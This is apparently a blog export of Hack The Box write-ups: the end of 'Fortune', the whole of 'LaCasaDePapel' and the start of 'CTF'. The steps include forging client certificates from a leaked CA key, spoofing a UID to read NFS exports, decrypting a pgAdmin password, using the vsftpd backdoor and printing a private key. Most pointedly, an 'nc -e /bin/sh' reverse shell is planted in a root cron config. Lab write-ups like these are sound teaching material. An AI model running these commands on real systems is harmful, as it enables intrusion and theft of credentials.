??  S      6:38PM    0:00.41 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log_sshauth  4866  0.0  0.5 19164  5588 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log_sshauth 13512  0.0  0.5 19168  5564 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.log_sshauth 18294  0.0  0.5 19168  5564 ??  I      6:38PM    0:00.00 /usr/local/bin/uwsgi --daemonize /var/appsrv/sshauth/sshauthd.logThe web app has a route for /generate which calls a function that generates a new SSH keypair and displays it to the user.@app.route('/generate', methods=['GET'])def sshauthd():  # SSH key generation code courtesy of:  # https://msftstack.wordpress.com/2016/10/15/generating-rsa-keys-with-python-3/  #  from cryptography.hazmat.primitives import serialization  from cryptography.hazmat.primitives.asymmetric import rsa  from cryptography.hazmat.backends import default_backend  # generate private/public key pair  key = rsa.generate_private_key(backend=default_backend(), public_exponent=65537, \\    key_size=2048)  # get public key in OpenSSH format  public_key = key.public_key().public_bytes(serialization.Encoding.OpenSSH, \\    serialization.PublicFormat.OpenSSH)  # get private key in PEM container format  pem = key.private_bytes(encoding=serialization.Encoding.PEM,    format=serialization.PrivateFormat.TraditionalOpenSSL,    encryption_algorithm=serialization.NoEncryption())  # decode to printable strings  private_key_str = pem.decode('utf-8')  public_key_str = public_key.decode('utf-8')  db_response = db_write(public_key_str)  if db_response == False:    return render_template('error.html')  else:    return render_template('display.html', private_key=private_key_str, public_key=public_key_str)Looking at the httpd.conf configuration file, I see that the /generate route is accessible only on the HTTPS port. However I can’t access the HTTPS port because the server is configured for client certificate authentication.&gt; cat /etc/httpd.confserver \"fortune.htb\" {        listen on * port 80        location \"/\" {                root \"/htdocs/fortune\"        }        location \"/select\" {                fastcgi socket \"/run/fortune/fortuned.socket\"        }}server \"fortune.htb\" {        listen on * tls port 443        tls client ca \"/etc/ssl/ca-chain.crt\"        location \"/\" {                root \"/htdocs/sshauth\"        }        location \"/generate\" {                fastcgi socket \"/run/sshauth/sshauthd.socket\"        }}I keep looking and find a boatload of certificates in bob’s home directory:&gt; ls -lR /home/bobtotal 8drwxr-xr-x  7 bob  bob  512 Oct 29 20:57 cadrwxr-xr-x  2 bob  bob  512 Nov  2 22:40 dba/home/bob/ca:total 48drwxr-xr-x  2 bob  bob   512 Oct 29 20:44 certsdrwxr-xr-x  2 bob  bob   512 Oct 29 20:37 crl-rw-r--r--  1 bob  bob   115 Oct 29 20:56 index.txt-rw-r--r--  1 bob  bob    21 Oct 29 20:56 index.txt.attr-rw-r--r--  1 bob  bob     0 Oct 29 20:37 index.txt.olddrwxr-xr-x  7 bob  bob   512 Nov  3 15:37 intermediatedrwxr-xr-x  2 bob  bob   512 Oct 29 20:56 newcerts-rw-r--r--  1 bob  bob  4200 Oct 29 20:55 openssl.cnfdrwx------  2 bob  bob   512 Oct 29 20:41 private-rw-r--r--  1 bob  bob     5 Oct 29 20:56 serial-rw-r--r--  1 bob  bob     5 Oct 29 20:37 serial.old/home/bob/ca/certs:total 8-r--r--r--  1 bob  bob  2053 Oct 29 20:44 ca.cert.pem/home/bob/ca/crl:/home/bob/ca/intermediate:total 52drwxr-xr-x  2 bob  bob   512 Nov  3 15:40 certsdrwxr-xr-x  2 bob  bob   512 Oct 29 20:46 crl-rw-r--r--  1 bob  bob     5 Oct 29 20:47 crlnumberdrwxr-xr-x  2 bob  bob   512 Oct 29 21:13 csr-rw-r--r--  1 bob  bob   107 Oct 29 21:13 index.txt-rw-r--r--  1 bob  bob    21 Oct 29 21:13 index.txt.attrdrwxr-xr-x  2 bob  bob   512 Oct 29 21:13 newcerts-rw-r--r--  1 bob  bob  4328 Oct 29 20:56 openssl.cnfdrwxr-xr-x  2 bob  bob   512 Oct 29 21:13 private-rw-r--r--  1 bob  bob     5 Oct 29 21:13 serial-rw-r--r--  1 bob  bob     5 Oct 29 21:13 serial.old/home/bob/ca/intermediate/certs:total 24-r--r--r--  1 bob  bob  4114 Oct 29 20:58 ca-chain.cert.pem-r--r--r--  1 bob  bob  1996 Oct 29 21:13 fortune.htb.cert.pem-r--r--r--  1 bob  bob  2061 Oct 29 20:56 intermediate.cert.pem/home/bob/ca/intermediate/crl:/home/bob/ca/intermediate/csr:total 8-rw-r--r--  1 bob  bob  1013 Oct 29 21:12 fortune.htb.csr.pem-rw-r--r--  1 bob  bob  1716 Oct 29 20:53 intermediate.csr.pem/home/bob/ca/intermediate/newcerts:total 4-rw-r--r--  1 bob  bob  1996 Oct 29 21:13 1000.pem/home/bob/ca/intermediate/private:total 12-r--------  1 bob  bob  1675 Oct 29 21:10 fortune.htb.key.pem-rw-r--r--  1 bob  bob  3243 Oct 29 20:48 intermediate.key.pem/home/bob/ca/newcerts:total 8-rw-r--r--  1 bob  bob  2061 Oct 29 20:56 1000.pem/home/bob/ca/private:/home/bob/dba:total 4-rw-r--r--  1 bob  bob  195 Nov  2 22:40 authpf.sqlI compare the CA cert used by the httpd service with the certs found in the folder and I find a match for the intermediate CA cert.&gt; md5 /etc/ssl/ca-chain.crtMD5 (/etc/ssl/ca-chain.crt) = b5217e28843aace50f46951bc136632e&gt; md5 /home/bob/ca/intermediate/certs/ca-chain.cert.pemMD5 (/home/bob/ca/intermediate/certs/ca-chain.cert.pem) = b5217e28843aace50f46951bc136632eThe intermediate CA cert /home/bob/ca/intermediate/certs/intermediate.cert.pem and its private key /home/bob/ca/intermediate/private/intermediate.key.pem are both readable by my user.I download both Intermediate CA files and the CA cert on my machine then I combined the Intermediate CA cert and its private key into a PKCS12 package:openssl pkcs12 -export -inkey intermediate.key.pem -in intermediate.cert.pem -out snowscan.p12I’ll import both the Intermediate and CA certs into my Firefox trusted autorities store:Next, I import the PKCS12 file into my personal certificate storage:I’m prompted to chose a cert when connecting to the webpageI’m now able to access the HTTPS page:Generating a new SSH key for user nfsuserWhen I go to https://fortune.htb/generate, a new SSH keypair is generated and the private key is displayed:I can grab this key and use it to SSH as user nfsuser# vi fortune.key# chmod 400 fortune.key# ssh -i fortune.key nfsuser@10.10.10.127Hello nfsuser. You are authenticated from host \"10.10.14.23\"I don’t get a prompt however. Looking at the /etc/passwd file, I see that this user doesn’t have a shell associated with him:nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpfBecause the user is named nfsuser, it’s safe to assume there is something exported by NFS. I can see this in the /etc/exports file:&gt; cat /etc/exports/homeThe NFS port 2049 is firewalled but I can still access it by using local port forwarding in SSH.# ssh -i fortune.key -L 2049:fortune.htb:2049 nfsuser@fortune.htbLast login: Sat Mar  9 20:08:55 2019 from 10.10.14.23Hello nfsuser. You are authenticated from host \"10.10.14.23\"# mount -t nfs fortune.htb:/home /mnt# ls -l /mnttotal 6drwxr-xr-x 5 revssh   revssh   512 Nov  3 16:29 bobdrwxr-x--- 3 test1324 test1324 512 Nov  5 22:02 charliedrwxr-xr-x 2     1002     1002 512 Nov  2 22:39 nfsuserThe charlie user directory is mapped to user ID 1000. I already has a user ID 1000 created on my Kali Linux box with the name test1324:# grep test1324 /etc/passwdtest1324:x:1000:1000::/home/test1324:/bin/bashTo access charlie, I simply change to user test1324 then I’m to access the files and the user flag.root@ragingunicorn:~/htb/fortune# su test1324test1324@ragingunicorn:/root/htb/fortune$ cd /mnt/charlietest1324@ragingunicorn:/mnt/charlie$ lsmbox  user.txttest1324@ragingunicorn:/mnt/charlie$ cat user.txtada0af...There’s a mailbox file with a hint that we should look or the dba password next so we can log in as root:test1324@ragingunicorn:/mnt/charlie$ cat mboxFrom bob@fortune.htb Sat Nov  3 11:18:51 2018Return-Path: &lt;bob@fortune.htb&gt;Delivered-To: charlie@fortune.htbReceived: from localhost (fortune.htb [local])\tby fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53\tfor &lt;charlie@fortune.htb&gt;;\tSat, 3 Nov 2018 11:18:51 -0400 (EDT)From:  &lt;bob@fortune.htb&gt;Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)To: charlie@fortune.htbSubject: pgadmin4Message-ID: &lt;196699abe1fed384@fortune.htb&gt;Status: ROHi Charlie,Thanks for setting-up pgadmin4 for me. Seems to work great so far.BTW: I set the dba password to the same as root. I hope you don't mind.Cheers,BobTo get a proper shell, I added my SSH key to authorized_keys:test1324@ragingunicorn:/mnt/charlie$ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA[...]pgYyFnLt3ysDhscPOtelvd root@ragingunicorn\" &gt;&gt; .ssh/authorized_keysNow I can log in as charlieroot@ragingunicorn:~# ssh charlie@fortune.htbOpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.fortune$In /var/appsrv/pgadmin4, I find the database for the pgadmin application: pgadmin4.dbIt’s a sqlite database and I already have tools to view this:fortune$ file pgadmin4.dbpgadmin4.db: SQLite 3.x databaseI find the user authentication table as well as the server table that contains the encrypted dba account password:fortune$ sqlite3 pgadmin4.dbSQLite version 3.24.0 2018-06-04 19:24:41Enter \".help\" for usage hints.sqlite&gt; .tablesalembic_version              roles_usersdebugger_function_arguments  serverkeys                         servergroupmodule_preference            settingpreference_category          userpreferences                  user_preferencesprocess                      versionrolesqlite&gt; select * from user;1|charlie@fortune.htb|$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ|1|2|bob@fortune.htb|$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg|1|sqlite&gt; select * from server;1|2|2|fortune|localhost|5432|postgres|dba|utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz||prefer||||||&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt|&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key|||0||||0||22||0||0|I checked the pgadmin source code on github to understand how it decrypts the dba password and saw that the decrypt() function takes two arguments. Since I already have the two values from the database I’ll just copy/paste the code into a new script and punch in the values for bob’s user at the end.# cat root.pyimport base64import hashlibimport osimport sixfrom cryptography.hazmat.backends import default_backendfrom cryptography.hazmat.primitives.ciphers import Cipherfrom cryptography.hazmat.primitives.ciphers.algorithms import AESfrom cryptography.hazmat.primitives.ciphers.modes import CFB8padding_string = b'}'iv_size = AES.block_size // 8def pad(key):    \"\"\"Add padding to the key.\"\"\"    if isinstance(key, six.text_type):        key = key.encode()    # Key must be maximum 32 bytes long, so take first 32 bytes    key = key[:32]    # If key size is 16, 24 or 32 bytes then padding is not required    if len(key) in (16, 24, 32):        return key    # Add padding to make key 32 bytes long    return key.ljust(32, padding_string)def decrypt(ciphertext, key):    \"\"\"    Decrypt the AES encrypted string.    Parameters:        ciphertext -- Encrypted string with AES method.        key        -- key to decrypt the encrypted string.    \"\"\"    ciphertext = base64.b64decode(ciphertext)    iv = ciphertext[:iv_size]    cipher = Cipher(AES(pad(key)), CFB8(iv), default_backend())    decryptor = cipher.decryptor()    return decryptor.update(ciphertext[iv_size:]) + decryptor.finalize()res = decrypt(\"utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz\",  \"$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg\")print(res.decode('ascii'))Decryption works and I get the dba password:root@ragingunicorn:~/htb/fortune# python root.pyR3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!Based on the hint I found earlier, I know the root password is the same one used for dba:fortune$ suPassword:fortune# iduid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)fortune# cat /root/root.txt335af7..."
  },
  
  {
    "title": "LaCasaDePapel - Hack The Box",
    "url": "/posts/htb-writeup-lacasa/",
    "categories": "hackthebox, infosec",
    "tags": "otp, vsftpd, cronjob, openssl, certificates, ssh, ssh rsa auth, php, psysh, nodejs",
    "date": "2019-07-27 00:00:00 +0800",
    





    
    "snippet": "I had trouble with the OTP token on this box: I never figured out why but whenever I scanned the QR code with my Google Authenticator app it would always generate an invalid token. Using a Firefox ...",
    "content": "I had trouble with the OTP token on this box: I never figured out why but whenever I scanned the QR code with my Google Authenticator app it would always generate an invalid token. Using a Firefox add-on I was able to properly generate the token to get access to the page. As a nice twist, the login shell was changed to psysh so I couldn’t use the vsftpd exploit to get a full shell on the box. LaCasaDePapel has some typical HTB elements: scavenger hunt for SSH keys, base64 encoding and a cronjob running as root for final priv esc.Summary  The main page requires an OTP token to log in, which we can generate using a Google Authenticator compatible app  vsftpd contains a backdoor which allows us to get partial RCE through the psysh shell and read files  We can scan the filesystem and find the CA key and an email with a link that let us login to the main webpage and download the CA certificate  We can import both CA crt and CA key in Firefox and then log in to the HTTPS page  The page contains the ?path and /file/ functions to list and read files (file’s full path is base64 encoded)  After reading user.txt , we can fetch the SSH private key for user professor and log in via SSH  The professor’s home directory is SGID and we can replace the memcached.ini which controls the parameters of a cronjob running as root  We replace the memcached.ini file with our own file that spawns a reverse shell with netcat, gaining root accessNmap# nmap -sC -sV -F 10.10.10.131Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-31 01:32 EDTNmap scan report for lacasadepapel.htb (10.10.10.131)Host is up (0.010s latency).Not shown: 96 closed portsPORT    STATE SERVICE  VERSION21/tcp  open  ftp      vsftpd 2.3.422/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)| ssh-hostkey: |   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)80/tcp  open  http     Node.js (Express middleware)|_http-title: La Casa De Papel443/tcp open  ssl/http Node.js Express framework| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  Server returned status 401 but no WWW-Authenticate header.| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel| Not valid before: 2019-01-27T08:35:30|_Not valid after:  2029-01-24T08:35:30Service Info: OS: UnixFTP enumerationFTP anonymous access is not allowed on the FTP server# ftp 10.10.10.131Connected to 10.10.10.131.220 (vsFTPd 2.3.4)Name (10.10.10.131:root): anonymous331 Please specify the password.Password:530 Login incorrect.Login failed.HTTP enumeration Port 80The web page on port 80 contains a login form asking for an OTP token. There’s a link to the Google Authenticator application.For some reason I had problems with the Google Auth app on my phone and the token I got was always invalid. So instead I used the Firefox Authenticator Add-On instead. I’ll just enter the token manually in the add-on then generate a token. The token is captured from the link in the QR code image.I can re-use the same token for multiple requests as long as I send the same secret.For example: secret=MFFHCQSUOZ3XMTLMJFBS6TS2FJGEO4BQ&amp;token=072534&amp;email=test%40test.com will work everytime.HTTP enumeration Port 443The page on port 443 requires a client certificate which I don’t have yet.vsftpd exploitThe vsftpd version running on this box is vulnerable and there is already a Metasploit module for it:I ran the Metasploit module but didn’t get a session back.I ran the exploit again and got a message that the port was already open. So the exploit worked and opened port 6200 but Metasploit didn’t detect a shell listening.Ok, here’s why, bash is not listening on port 6200 but rather psysh, some kind of PHP shell cli.# nc -nv 10.10.10.131 6200Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Connected to 10.10.10.131:6200.Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin HilemanI can’t run system or any other commands that’ll give me a shell, as those are specifically blacklisted in the disable_functions parameter of the php.ini configuration file but I can use the scandir and readfile functions to poke at the filesystem.scandir('/home');=&gt; [     \".\",     \"..\",     \"berlin\",     \"dali\",     \"nairobi\",     \"oslo\",     \"professor\",   ]scandir('/home/berlin');=&gt; [     \".\",     \"..\",     \".ash_history\",     \".ssh\",     \"downloads\",     \"node_modules\",     \"server.js\",     \"user.txt\",   ]scandir('/home/dali');=&gt; [     \".\",     \"..\",     \".ash_history\",     \".config\",     \".qmail-default\",     \".ssh\",     \"server.js\",   ]scandir('/home/nairobi');=&gt; [     \".\",     \"..\",     \"ca.key\",     \"download.jade\",     \"error.jade\",     \"index.jade\",     \"node_modules\",     \"server.js\",     \"static\",   ]dir('/home/oslo');=&gt; [     \".\",     \"..\",     \"Maildir\",     \"inbox.jade\",     \"index.jade\",     \"node_modules\",     \"package-lock.json\",     \"server.js\",     \"static\",   ]scandir('/home/nairobi');=&gt; [     \".\",     \"..\",     \"ca.key\",     \"download.jade\",     \"error.jade\",     \"index.jade\",     \"node_modules\",     \"server.js\",     \"static\",   ]In Oslo’s mail directory I find an email that seemed to have been generated when I logged in with the OTP token on the main webpage.scandir('/home/oslo/Maildir');=&gt; [     \".\",     \"..\",     \".Sent\",     \".Spam\",     \"cur\",     \"new\",     \"tmp\",   ]scandir('/home/oslo/Maildir/.Sent/cur');=&gt; [     \".\",     \"..\",     \"1553996613811.M45533P25345V0000000000064766I000000000bddc36.lacasadepapel.htb,S=430,2,S\",   ]readfile('/home/oslo/Maildir/.Sent/cur/1553996613811.M45533P25345V0000000000064766I000000000bddc36.lacasadepapel.htb,S=430,2,S');Content-Type: text/plain; format=flowedFrom: dali@lacasadepapel.htbContent-Transfer-Encoding: 7bitDate: Sun, 31 Mar 2019 01:53:01 +0000Message-Id: &lt;1553997181916-f1bee4c5-810b2c36-4f055080@lacasadepapel.htb&gt;MIME-Version: 1.0Welcome to our community!Thanks for signing up. To continue, please verify your email address by clicking the url below.https://lacasadepapel.htb/64fd1030-5356-11e9-ae89-233fa7c29f94=&gt; 430I also find the CA private key in Nairobi’s home directory:readfile('/home/nairobi/ca.key');-----BEGIN PRIVATE KEY-----MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRluXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8MYQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyps2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+UsPCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3VDj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU891+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mruaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVdI0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bEG3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmnsqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDHCTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Ysm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNIikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9MWGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsRaRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc53udBEzjt3WPqYGkkDknVhjD-----END PRIVATE KEY-----=&gt; 1704Following the link from the email, I get to the following page:There’s a link to an online CSR generator and also a link to the CA certificate file:-----BEGIN CERTIFICATE-----MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFsYWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0xOTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRlcGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rVQJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUVESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiRPBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+ChXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywxBoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkIEqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwliMgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4-----END CERTIFICATE-----I can convert both cert and key into a PKCS12 certificate and import it in Firefox.# openssl pkcs12 -export -out certificate.pfx -inkey ca.key -in ca.crt -certfile ca.crtEnter Export Password:Verifying - Enter Export Password:I now have access to the HTTPS web page, where I can browse and download files.&lt;a href=\"?path=SEASON-1\"&gt;SEASON-1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=\"?path=SEASON-2\"&gt;SEASON-2&lt;/a&gt;Ok, so the full path of the file read is encoded as base64. Let’s try reading /etc/passwd:My attempt failed but I saw that the path was inside /home/berlin/downloads. To read /etc/passwd I just used a relative path by adding a couple of  ../  before the path.Ok, nice I can now read /etc/passwd. Let’s try reading the user.txt flag in berlin’s home directoryNice, I have user’s flag: 4dcbd172fc9c9ef2ff65c13448d9062dGetting a shell and priv escNext I found some SSH private key in /home/berlin/.ssh/:After getting the key I tried using it with the obvious suspect, user berlin but it didn’t work. However I was able to log in to user professor:Professor’s home directory has interesting permissions, it has the SGID bit set.I noticed that the process ID increments for /home/professor/memcached.js so I assume there is a cronjob running that process every few minutes.lacasadepapel [~]$ ps -ef | grep node 3265 dali      0:00 /usr/bin/node /home/dali/server.js 3266 nobody    2:21 /usr/bin/node /home/oslo/server.js 3267 berlin    0:00 /usr/bin/node /home/berlin/server.js 3268 nobody    0:16 /usr/bin/node /home/nairobi/server.js14133 nobody    0:21 /usr/bin/node /home/professor/memcached.js14150 professo  0:00 grep node[...]lacasadepapel [~]$ ps -ef | grep node 3265 dali      0:00 /usr/bin/node /home/dali/server.js 3266 nobody    2:23 /usr/bin/node /home/oslo/server.js 3267 berlin    0:00 /usr/bin/node /home/berlin/server.js 3268 nobody    0:16 /usr/bin/node /home/nairobi/server.js14203 nobody    0:16 /usr/bin/node /home/professor/memcached.js14213 professo  0:00 grep nodememcached.ini contains the configuration of the process running.lacasadepapel [~]$ cat memcached.ini[program:memcached]command = sudo -u nobody /usr/bin/node /home/professor/memcached.jsI can’t change this file:lacasadepapel [~]$ echo invalid &gt; memcached.ini-ash: can't create memcached.ini: Permission deniedBut I can delete it because of the SGID permission:lacasadepapel [~]$ rm memcached.inirm: remove 'memcached.ini'? ylacasadepapel [~]$ lsmemcached.js  node_modulesOk, so now I can just create a new file that’ll spawn a reverse shell as root:[program:memcached]command = sudo /usr/bin/nc 10.10.14.23 4444 -e /bin/shThen wait a few minutes… Root shell!# nc -lvnp 4444Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.10.131.Ncat: Connection from 10.10.10.131:43525.iduid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)cd /rootlsroot.txtcat root.txt586979...."
  },
  
  {
    "title": "CTF - Hack The Box",
    "url": "/posts/htb-writeup-ctf/",
    "categories": "hackthebox, infosec",
    "tags": "secureid, injection, otp, php, ldap, cronjob, 7zip",
    "date": "2019-07-20 00:00:00 +0800",
    





    
    "snippet": "This time it’s a very lean box with no rabbit holes or trolls. The box name does not relate to a Capture the Flag event but rather the Compressed Token Format used by RSA securid tokens. The first ...",
    "content": "This time it’s a very lean box with no rabbit holes or trolls. The box name does not relate to a Capture the Flag event but rather the Compressed Token Format used by RSA securid tokens. The first part of the box involves some blind LDAP injection used to extract the LDAP schema and obtain the token for one of the user. Then using the token, we are able to generate tokens and issue commands on the box after doing some more LDAP injection. The last part of the token was pretty obscure as it involved abusing the listfile parameter in 7zip to trick it into read the flag from root.txt. I was however not able to get a root shell on this box using this technique.Summary  A hint in the HTML comments of the login page mentions a 81-digit token  I can fuzz the usernames on the login page and find that there is a valid user named ldapuser  An LDAP injection allows me to extract the token from the pager LDAP attribute of user ldapuser  The group membership check on the command execution page can be bypassed by an LDAP injection on the uid attribute  I get a shell with a simple perl reverse shell command  There’s a script running every minute that compresses and encrypt all files under /var/www/html/upload  I can use the listfile parameter in 7-zip to force the program to read the root.txt file inside the root directoryTools/Blogs used  RSA SecurID-compatible software token for Linux/UNIX systemsDetailed stepsThe box doesn’t have anything listening other than SSH and Apache:# nmap -sC -sV -p- 10.10.10.122Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 19:02 ESTNmap scan report for ctf.htb (10.10.10.122)Host is up (0.0077s latency).Not shown: 65533 filtered portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: |   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16|_http-title: CTFQuick web enumerationThe box creators have implemented a rate-limit system on the box using fail2ban to prevent people from blindly bruteforcing it (dirbuster, sqlmap, etc.).The main page has a link to a status page where I can see if any IP address is currently banned.And there’s also a login page, which prompts for a username and a One Time Password (OTP)Based on the HTML comments of the page, I can see that the token stored on the server contains 81 digits:The token is not the password but rather the cryptographic material used to generate the one time passwords. A new password is generated at regular time interval. To generate a matching password, the client must:  Configure the token software with the same token information (81 digits) as the one on the server  The time on the client machine must be the same (or close enough) as the serverThe server return an invalid user error message whenever I use an invalid user ID:Username enumerationTo enumerate the users on the system, I use wfuzz with a wordlist. Luckily, the login page doesn’t appear to be rate-limited so I can quickly scan through the wordlists. This part took a while though, I had to try various wordlists from seclists since my first picks didn’t contain that user.# wfuzz -c -w /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt --hs \"not found\" -d \"inputUsername=FUZZ&amp;inputOTP=12345\" -u http://ctf.htb/login.php000003:  C=200     68 L\t     229 W\t   2810 Ch\t  \"!@#\"000004:  C=200     68 L\t     229 W\t   2810 Ch\t  \"!@#%\"000005:  C=200     68 L\t     229 W\t   2810 Ch\t  \"!@#%^\"000006:  C=200     68 L\t     229 W\t   2810 Ch\t  \"!@#%^&amp;\"000011:  C=200     68 L\t     229 W\t   2810 Ch\t  \"*****\"000007:  C=200     68 L\t   